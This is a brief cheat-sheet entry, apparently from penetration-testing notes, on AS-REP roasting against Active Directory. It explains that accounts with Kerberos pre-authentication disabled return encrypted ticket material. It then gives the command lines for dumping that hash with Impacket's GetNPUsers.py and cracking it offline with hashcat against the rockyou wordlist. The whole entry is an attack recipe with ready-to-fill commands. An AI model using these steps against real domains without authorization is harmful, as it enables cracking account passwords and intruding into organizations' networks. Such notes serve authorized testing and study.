Account/Service needs Kerberos pre-authentication to be disabled. This means that we can request the encrypted TGT for this user. As the TGT contains material that is encrypted with the user's NTLM hash, we can subject this to an offline brute force attack, and attempt to get the password.

The GetNPUsers.py script from Impacket can be used to request a TGT ticket and dump the
hash.

```
GetNPUsers.py -no-pass -dc-ip <IP> <domain>/<user>
```

Crack the hash with hashcat
```
hashcat -m 18200 <file.hash> /usr/share/wordlists/rockyou.txt --force
```

